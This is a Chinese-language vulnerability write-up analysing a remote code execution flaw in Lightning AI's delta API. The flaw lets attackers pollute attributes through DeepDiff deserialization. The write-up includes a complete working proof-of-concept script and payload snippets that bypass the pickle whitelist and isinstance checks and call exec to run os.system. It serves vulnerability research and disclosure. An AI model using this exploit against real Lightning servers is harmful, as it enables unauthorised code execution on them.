1、漏洞介绍
------

前几天在逛huntr的时候，发现一个很有意思的漏洞，他是通过反序列化从而去污染类和属性导致的rce，在作者的描述中大致说明的漏洞的原理，该漏洞是通过绕过`Deepdiff`的反序列化限制，包括绕过魔术方法和白名单绕过，通过魔术方法可以访问其他模块、类和实例，并使用这种任意属性写入，最终导致rce。

> 原文链接：<https://huntr.com/bounties/486add92-275e-4a7b-92f9-42d84bc759da>

这里我将原版的poc稍加进行改造，将Helper class转换后的内容直接写了出来，方便分析。

```python
import requests, time, pickle, pickletools
from collections import namedtuple
from ordered_set import OrderedSet

def send_delta(d):
    requests.post(server_host + '/api/v1/delta', headers={
        'x-lightning-type': '1',
        'x-lightning-session-uuid': '1',
        'x-lightning-session-id': '1'
    }, json={"delta": d})

# Monkey patch OrderedSet reduce to make it easier to pickle
OrderedSet.__reduce__ = lambda self, *args: (OrderedSet, ())

server_host = 'http://127.0.0.1:7501'
command = 'dir'

# this code is injected and ran on the remote host
injected_code = f"__import__('os').system('calc.exe')" + '''
import lightning, sys
from lightning.app.api.request_types import _DeltaRequest, _APIRequest
lightning.app.core.app._DeltaRequest = _DeltaRequest
from lightning.app.structures.dict import Dict
lightning.app.structures.Dict = Dict
from lightning.app.core.flow import LightningFlow
lightning.app.core.LightningFlow = LightningFlow
LightningFlow._INTERNAL_STATE_VARS = {"_paths", "_layout"}
lightning.app.utilities.commands.base._APIRequest = _APIRequest
del sys.modules['lightning.app.utilities.types']'''

bypass_isinstance = OrderedSet

delta = {
    'attribute_added': {
        "root['function']": namedtuple,

        # 绕过_collect_deltas_from_ui_and_work_queues中的isinstance(delta, _DeltaRequest)
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].core.app._DeltaRequest": str,

        # 绕过_process_requests中的isinstance(request, _APIRequest)
        "root['bypass_isinstance']": bypass_isinstance,
        # 将OrderedSet的__instancecheck__设置有内容使其返回true，但不可为可迭代的，否则isinstance会报错
        "root['bypass_isinstance'].'__instancecheck__'": str,
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].utilities.commands.base._APIRequest": bypass_isinstance(),

        # 绕过get_component_by_name中的isinstance(current, LightningDict)，使其能够遍历普通字典
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].structures.Dict": dict,

        # 绕过get_component_by_name中的if not isinstance(child, ComponentTuple):
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].core.LightningFlow": bypass_isinstance(),
        "root['function'].'__globals__'['_sys'].modules['typing'].Union": list,

        # 防止前面程序报错将`provided_state["vars"]`覆盖为空，就不会经过for循环
        "root['vars']": {},
        # or 将`_INTERNAL_STATE_VARS`覆盖为空，也不会进入报错对应的if条件语句里。
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].core.flow.LightningFlow._INTERNAL_STATE_VARS": (),

        "root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.name": "root.__init__.__builtins__.exec",
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.method_name": "__call__",
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.args": (injected_code,),
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.kwargs": {},
        "root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.id": "root"
    }
}

payload = pickletools.optimize(pickle.dumps(delta, 1)).decode() \
    .replace('__builtin__', 'builtins') \
    .replace('unicode', 'str')

# Sends the payload and does all of our attribute pollution
send_delta(payload)

# Small delay to ensure payload was processed
time.sleep(0.2)
send_delta({})  # Code path triggers when this delta is recieved
```

接下来我将结合poc和代码对此漏洞进行分析

2、漏洞入口及反序列化点
------------

首先来看触发反序列化的点以及入口

![image-20240912173227906](https://shs3.b.qianxin.com/butian_public/f992fbee22c61f2bf6c4e3b33301a8c00.png)

当访问`/api/v1/delta`的接口时，从请求体中获取JSON数据并解析为字典类型，并取字典中的值`delta`作为参数实例化`Delta`，最后放入`api_app_delta_queue`队列中。

在实例化的过程中，会判断传入的类型，如果传入的字符串类型的则会调用`pickle_load`进行反序列化

![image-20240912174847719](https://shs3.b.qianxin.com/butian_public/fb405d081aa959f726b8e4afb3fefce2e.png)

在反序列化的时候会有一个白名单，需要反序列化的类必须在白名单里，所以一些常规的反序列化漏洞在这里都不能用。

![image-20240911163008161](https://shs3.b.qianxin.com/butian_public/f6ae379ae6ccafc7c8b5f9db244dd3198.png)

3、漏洞利用方式
--------

看完了入口和反序列化，主要来看一下漏洞利用方式。

在随后的代码中，程序会先从队列中去除`delta`对象，如果有多个的话会被其进行遍历，然后进行`+`操作

![image-20240911105732717](https://shs3.b.qianxin.com/butian_public/fe9d112ddb1a374017718228bbd954d15.png)

在进行`+`操作时，实际上时调用类中的`__add__`方法，在此方法中，我们主要看一下`self._do_attribute_added()`，

![image-20240911105453074](https://shs3.b.qianxin.com/butian_public/f49e70bcb2d0caa68528273eb63258f17.png)

在`self._do_attribute_added()`中，获取`attribute_added`中的内容，然后之后会根据其内容中的键值对动态的给类添加属性和值

![image-20240911105950923](https://shs3.b.qianxin.com/butian_public/f034827b030a438e935b9fe492734ac67.png)

这里的`attribute_added`依然是我们传入的字典，只不过内容已经是反序列化后的内容

![image-20240911110604348](https://shs3.b.qianxin.com/butian_public/fcd60c27ddd3e519a285224a1b20bf59f.png)

`_do_item_added()`的关键代码如下

```python
    def _do_item_added(self, items, sort=True, insert=False):
        if sort:
            try:
                items = sorted(items.items(), key=self._sort_key_for_item_added)
            except TypeError:
                items = sorted(items.items(), key=cmp_to_key(self._sort_comparison))
        else:
            items = items.items()

        for path, new_value in items:
            elem_and_details = self._get_elements_and_details(path)
            if elem_and_details:
                elements, parent, parent_to_obj_elem, parent_to_obj_action, obj, elem, action = elem_and_details
            else:
                continue

            # Insert is only true for iterables, make sure it is a valid index.
            if(insert and elem < len(obj)):
                obj.insert(elem, None)

            self._set_new_value(parent, parent_to_obj_elem, parent_to_obj_action,
                                obj, elements, path, elem, action, new_value)
```

在`_do_item_added`中首先进行排序，然后遍历排序后的字典，使用`self._get_elements_and_details`方法通过字典中的键，也就是路径解析来定位对象，最后通过 `_set_new_value()` 使用字典的值更新最终的值。由于值以及时我们反序列化后的内容，所以这里的值可以为任何类型，例如对象，字符串，字典等。

这里主要关注的有两点，一是程序如何对路径进行解析的，二是如何动态的给类添加属性

首先来看对路径的解析，下面是获取路径中元素的方法：

```python
def _get_elements_and_details(self, path):
    try:
        elements = _path_to_elements(path)  # 解析给定的路径，返回一个元组
        if len(elements) > 1:
            elements_subset = elements[:-2]
            if len(elements_subset) != len(elements):
                next_element = elements[-2][0]
                next2_element = elements[-1][0]
            else:
                next_element = None
            parent = self.get_nested_obj(obj=self, elements=elements_subset, next_element=next_element)
            parent_to_obj_elem, parent_to_obj_action = elements[-2]
            obj = self._get_elem_and_compare_to_old_value(
                obj=parent, path_for_err_reporting=path, expected_old_value=None,
                elem=parent_to_obj_elem, action=parent_to_obj_action, next_element=next2_element)
    except Exception as e:
        self._raise_or_log(UNABLE_TO_GET_ITEM_MSG.format(path, e))
        return None
    return elements, parent, parent_to_obj_elem, parent_to_obj_action, obj, elem, action
```

首先通过`_path_to_elements(path)`解析路径，它会解析给定的路径，并将路径中的每一部分提取为元素，同时确定访问这些元素时应该使用的操作类型（如 `GET` 或 `GETATTR`）。这里的代码比较复杂，所以这里举一个例子来了解函数的作用：

例如在解析这个路径的时候

```php
"root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.test6"
```

就会返回

```php
(('root', 'GETATTR'), ('function', 'GET'), ('__globals__', 'GETATTR'), ('_sys', 'GET'), ('modules', 'GETATTR'), ('lightning.app', 'GET'), ('api', 'GETATTR'), ('request_types', 'GETATTR'), ('_DeltaRequest', 'GETATTR'), ('test6', 'GETATTR'))
```

这里在解析路径的时候，其中在将路径和操作写入元组的时候会判断元素是否以`__`开头的，如果是则进入不了if条件里进行`elements.append((elem, action))`添加操作

![image-20240910184018353](https://shs3.b.qianxin.com/butian_public/f5c8d3f879853b5acc8ab5f4137c02640.png)

但这里可以通过引号绕过，例如`root['function'].'__globals__'['_sys']...`，而且完全不影响后面的解析，因为在之后的`literal_eval()`方法里会将两边的引号去除。

```python
def literal_eval(node_or_string):
    """
    Evaluate an expression node or a string containing only a Python
    expression.  The string or node provided may only consist of the following
    Python literal structures: strings, bytes, numbers, tuples, lists, dicts,
    sets, booleans, and None.

    Caution: A complex expression can overflow the C stack and cause a crash.
    """
    if isinstance(node_or_string, str):
        node_or_string = parse(node_or_string.lstrip(" \t"), mode='eval')
    if isinstance(node_or_string, Expression):
        node_or_string = node_or_string.body
    ...
    def _convert(node):
        if isinstance(node, Constant):
            return node.value
        ...
    return _convert(node_or_string)
```

上面是`literal_eval`部分代码，当输入的参数为`'__globals__'`时，由于他是字符串，因此首先会调用`ast.parse()` 将该字符串解析为抽象语法树（AST）。然后会检查是否是一个 `Expression` 对象。如果是，它会取出 `Expression` 的主体部分（`body`），即一个 `Constant` 节点，表示 `__globals__`。然后会调用 `_convert()` 函数来处理这个 `Constant` 节点。由于节点类型是 `Constant`，并且它的值是合法的 Python 字面量（在这里是字符串 `__globals__`），函数会直接返回这个值。

所以总的来说，因为它将字符串当作**Python 字面量**（直接表示固定值的数据）来解析。在 Python 里，带引号的内容是一个字符串字面量，`literal_eval` 会解析这个字面量，提取出引号中间的实际内容，返回不带引号的值。

在接下来的`_get_nested_obj`方法中，根据前面解析之后的`elements` 列表（例如 `GET` 或 `GETATTR`），从当前对象`self`中逐步提取嵌套对象。由于这里是取倒数第二个之前的所有元素的操作，所以这里获取的是目标对象的父对象。

```python
def _get_nested_obj(obj, elements, next_element=None):
    for (elem, action) in elements:
        if action == GET:
            obj = obj[elem]
        elif action == GETATTR:
            obj = getattr(obj, elem)
    return obj
```

这里的起始对象是`self`，也就是`Delta`，如果操作是 `GET`，则将对象视为字典，并获取 `elem` 对应的值。如果操作是 `GETATTR`，则调用 `getattr()` 获取对象的属性。

由于之前我们反序列化的时候将`root['function']`的值覆盖成了`namedtuple`（在白名单里），而`namedtuple`的属性中又包含`__globals__`，得到了全局变量我们便可以获取到任意的模块方法和变量。

由于上面获取的是父对象，在`_get_elem_and_compare_to_old_value`中在获取到目标对象，可看到这个方法和上面获取对象的方法很相似。

```python
def _get_elem_and_compare_to_old_value(self, obj, path_for_err_reporting, expected_old_value, elem=None, action=None,
forced_old_value=None, next_element=None):
    try:
        if action == GET:
            current_old_value = obj[elem]
        elif action == GETATTR:
            current_old_value = getattr(obj, elem)
        else:
            raise DeltaError(INVALID_ACTION_WHEN_CALLING_GET_ELEM.format(action))
    except (KeyError, IndexError, AttributeError, TypeError) as e:
        ...
    return current_old_value
```

以上，通过对路径的解析成功获取到了目标对象，接下来看看如何动态的给类添加属性，具体实现方法在`self._set_new_value`中

```python
def _simple_set_elem_value(self, obj, path_for_err_reporting, elem=None, value=None, action=None):
    """
    Set the element value directly on an object
    """
    try:
        if action == GET:
            try:
                obj[elem] = value
            except IndexError:
                if elem == len(obj):
                    obj.append(value)
                else:
                    self._raise_or_log(ELEM_NOT_FOUND_TO_ADD_MSG.format(elem, path_for_err_reporting))
        elif action == GETATTR:
            setattr(obj, elem, value)
        else:
            raise DeltaError(INVALID_ACTION_WHEN_CALLING_SIMPLE_SET_ELEM.format(action))
    except (KeyError, IndexError, AttributeError, TypeError) as e:
        self._raise_or_log('Failed to set {} due to {}'.format(path_for_err_reporting, e))
```

这里传入的`obj`已经是获取到的目标对象，这里会判断如果 `action` 是 `GET`，表示需要通过索引或键访问 `obj` 来设置值。如果 `action` 是 `GETATTR`，表示需要通过`setattr`方法给对象的属性设置值。

综上所述，我们可以通过对一个字典格式的类型进行序列化后请求`/api/v1/delta`并发送，后端会自动对其进行反序列化，并且在之后的操作中，会根据字典中的键作为路径进行解析，并通过路径找到对应的类，并通过`setattr`方法将传入字典的值给对象的属性设置值。

打过ctf做过ssti类型的题目的人会很快想到，如果可以调用某个对象的魔术方法和内置类，理论就可以通过调用基类（`__bases__`）或者当前函数或方法的全局命名空间（`__globals__`），然后就可以调用任意类和方法。通过上面这个方法，我们可以动态的修改和添加对象的属性

4、各种绕过
------

### （1）绕过isinstance(delta, \_DeltaRequest)检测

这里在遍历received\_deltas时，会有一处判断`isinstance(delta, _DeltaRequest)`，但这里我们要进入的是`api_or_command_request_deltas.append(delta)`，使得`api_or_command_request_deltas`不为空，所以这里要覆盖`_DeltaRequest`为其他，让他判断为假就能进入else语句。

payload:

```php
"root['function'].'__globals__'['_sys'].modules['lightning.app'].core.app._DeltaRequest": str
```

这样将`_DeltaRequest`类覆盖为`str`类，在进行`isinstance(delta, _DeltaRequest)`返回False，最后就可以进入`_process_requests`方法

![image-20240911154201060](https://shs3.b.qianxin.com/butian_public/f2f9d3a57e7beeb3dc8241647f8221c38.png)

### （2） 绕过isinstance(request, \_APIRequest)检测

接下来`_process_requests`方法中，又会判断`request`是否是`_APIRequests`或类型的实例，这里我们需要要进入`_process_api_request(app, request)`

![image-20240911154116997](https://shs3.b.qianxin.com/butian_public/fc253b36bb3db79ffef43087334c4e7b3.png)

我们可以将`delta`对象中添加`OrderedSet`对象，并在`OrderedSet`中添加`__instancecheck__`属性为`str`，使得允许对`OrderedSet`实例的所有`isinstance`调用返回True

> `__instancecheck__` 是 Python 中的特殊方法，用于定制 `isinstance()` 函数的行为。你可以自定义 `isinstance()` 的逻辑，使其在特定条件下返回 `True` 或 `False`，甚至可以跳过默认的类型检查逻辑。

payload:

```php
bypass_isinstance = OrderedSet

# 绕过_process_requests中的isinstance(request, _APIRequest)
"root['bypass_isinstance']": bypass_isinstance,
# 将OrderedSet的__instancecheck__设置有内容使其返回true，但不可为可迭代的，否则isinstance会报错，因为上一句设置了
"root['bypass_isinstance'].'__instancecheck__'": str,
```

然后将`_APIRequests`也覆盖为`OrderedSet`对象就可以通过`isinstance`验证进入`_process_api_request`

payload:

```php
"root['function'].'__globals__'['_sys'].modules['lightning.app'].utilities.commands.base._APIRequest": bypass_isinstance(),
```

最后在`_process_api_request`中，通过 `get_component_by_name(request.name)` 并根据`request.name`的值获取到最终需要执行的类

![image-20240912141118567](https://shs3.b.qianxin.com/butian_public/fb4dafd55c4773a3045b74bbd65593fe3.png)

### （3）绕过isinstance(child, ComponentTuple):检测

在`get_component_by_name`中，会对传入的路径进行解析（用`.`分割），然后使用for循环逐层获取嵌套属性，然后返回最终嵌套的类对象

```python
def get_component_by_name(self, component_name: str) -> Union["LightningFlow", LightningWork]:
    """Returns the instance corresponding to the given component name."""
    from lightning.app.structures import Dict as LightningDict
    from lightning.app.structures import List as LightningList
    from lightning.app.utilities.types import ComponentTuple

    if component_name == "root":
        return self.root
    if not component_name.startswith("root."):
        raise ValueError(f"Invalid component name {component_name}. Name must start with 'root'")

    current = self.root
    for child_name in component_name.split(".")[1:]:
        if isinstance(current, LightningDict):
            child = current[child_name]
        elif isinstance(current, LightningList):
            child = current[int(child_name)]
        else:
            child = getattr(current, child_name, None)
        if not isinstance(child, ComponentTuple):
            raise AttributeError(f"Component '{current.name}' has no child component with name '{child_name}'.")
        current = child  # type: ignore[assignment]
    return current
```

在这里我们构造的路径为`root.__init__.__builtins__.exec`，在逐层获取嵌套属性会对获取到的属性进行判断，如果为`LightningDict`则像字典一样使用 `current[child_name]` 获取，如果为`LightningList`，则将 `child_name` 转为整数并使用索引访问 ，否则使用 `getattr(current, child_name)` 动态获取对象的属性。

但是我们如果自定义的属性的类型肯定不会是`LightningDict`和`LightningList`，所以我们需要将其覆盖为普通的`dict`和`list`即可。并且后面的还会判断是否为`ComponentTuple`类型，由于这里的`ComponentTuple`是在函数中导入的，所以我们没法直接取覆盖`ComponentTuple`的值

![image-20240911175618337](https://shs3.b.qianxin.com/butian_public/f75db9e357dc5e05953b5cb4ba6628bcf.png)

这里会检查对象是否属于`ComponentTuple`元组中的任意一个类型，也就是是否是`(LightningFlow, LightningWork, Dict, List)`中符合其中之一

还记得前面我们已经`OrderedSet`修改了`__instancecheck__`属性使得使用`isinstance`检查都会返回True，所以这里只需将其中一个类覆盖为`OrderedSet`即可。这里我们将`LightningFlow`覆盖为`OrderedSet`。

### （4）绕过isinstance(current, LightningDict)检测

在这里还需要注意在红框上面调用了`typing.Union`，如果直接将`LightingFlow`覆盖为`OrderedSet`在这里会报错，所以我们还需要对`Union`覆盖为普通的`list`即可

payload:

```php
# 绕过get_component_by_name中的if not isinstance(child, ComponentTuple):
"root['function'].'__globals__'['_sys'].modules['lightning.app'].core.LightningFlow": bypass_isinstance(),
# 对Union覆盖为普通的`list`即可
"root['function'].'__globals__'['_sys'].modules['typing'].Union": list,
```

由于我们构造的路径中实际上是通过`self.root.__init__.__builtins__['exec']`去最终获取`exec`对象的

![image-20240912154947504](https://shs3.b.qianxin.com/butian_public/fdfbe0d5ff67a509f02494c8ae34612e3.png)

没有列表类型，所以我们只需要覆盖`LightningDict`类也就是`lightning.app.structures.Dict`为普通`dict`即可（`LightningDict`是`lightning.app.structures.Dict`的别名）

payload:

```php
# 绕过get_component_by_name中的isinstance(current, LightningDict)，使其能够遍历普通字典
"root['function'].'__globals__'['_sys'].modules['lightning.app'].structures.Dict": dict,
```

但是这里将`lightning.app.structures.Dict`类覆盖为普通`dict`后继续调试发现会导致之前的程序报错

![image-20240912170742792](https://shs3.b.qianxin.com/butian_public/fd8ef5c1233c4dda1331be7cba3254d0f.png)

![image-20240912164230894](https://shs3.b.qianxin.com/butian_public/f24c657dac2a245dedeb01c3d8df408ab.png)

在前面的程序中进行`setattr`的时候调用了`__satattr__`魔术方法，这里同样从`lightning.app.structures`导入`Dict`，由于前面我们将其覆盖成了正常的`dict`，所以在调用下面的`_set_child_name(self, value, name)`方法时会报错。

所以这里有两个方案，一个是将`provided_state["vars"]`覆盖为空，就不会经过for循环，

payload:

```php
"root['vars']": {},
```

另一个是查看`self._is_state_attribute(name)`方法使其返回false，我们查看这个方法

![image-20240912171019283](https://shs3.b.qianxin.com/butian_public/f160764e2d16d8a548bf07ecc66fc0c32.png)

这个方法对传入的name判断是否在`LightningFlow._INTERNAL_STATE_VARS`

![image-20240912171112020](https://shs3.b.qianxin.com/butian_public/fe462c76e0b633aaafcc57ccf0b3b7cd5.png)

所以也可以将`_INTERNAL_STATE_VARS`覆盖为空也可以

```php
# or 将`_INTERNAL_STATE_VARS`覆盖为空，也不会进入报错对应的if条件语句里。
"root['function'].'__globals__'['_sys'].modules['lightning.app'].core.flow.LightningFlow._INTERNAL_STATE_VARS": (),
```

5、函数调用
------

经过以上操作对属性修改，我们将`root.__init__.__builtins__.exec`赋值给`_DeltaRequest`的`name`属性，在`get_component_by_name`中对路径解析并获得`exec`对象

，想要让类的实例像函数一样被调用，实际上是通过`__call__`方法实现的，所以通过`getattr(flow, request.method_name)`获取他的`__call__`方法，然后在下面的`method(*request.args, **request.kwargs)`进行调用，最终实现任意函数执行

payload：

```python
injected_code = f"__import__('os').system('calc.exe')" + '''
import lightning, sys
from lightning.app.api.request_types import _DeltaRequest, _APIRequest
lightning.app.core.app._DeltaRequest = _DeltaRequest
from lightning.app.structures.dict import Dict
lightning.app.structures.Dict = Dict
from lightning.app.core.flow import LightningFlow
lightning.app.core.LightningFlow = LightningFlow
LightningFlow._INTERNAL_STATE_VARS = {"_paths", "_layout"}
lightning.app.utilities.commands.base._APIRequest = _APIRequest
del sys.modules['lightning.app.utilities.types']'''

"root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.name": "root.__init__.__builtins__.exec",
"root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.method_name": "__call__",
"root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.args": (injected_code,),
"root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.kwargs": {},
"root['function'].'__globals__'['_sys'].modules['lightning.app'].api.request_types._DeltaRequest.id": "root"
```

这里注入代码里除了有我们执行命令的语句，后面还跟了一堆，这是为了将之前绕过过程中修改的类还原，否则再次更换注入命令后不会走动态赋值的那部分代码。并且动态赋值的部分代码在绕过之后，所以我们发送第一个请求后需要再发一次请求才会走我们动态覆盖变量后的逻辑

![image-20240912172426297](https://shs3.b.qianxin.com/butian_public/fac09628e57d7fde9dcdbbe834f8c9d57.png)

总结：首先将传入的内容通过反序列化成一个对象，然后通过对字典键的解析作为函数调用的路径，值作为赋值的内容，可以动态修改所有类的属性和方法，然后通过绕过一系列的`isinstance`判断，最终在`get_component_by_name`方法内，该方法允许我们查找任意对象，最后在`method(*request.args, **request.kwargs)`进行调用，最终实现任意函数执行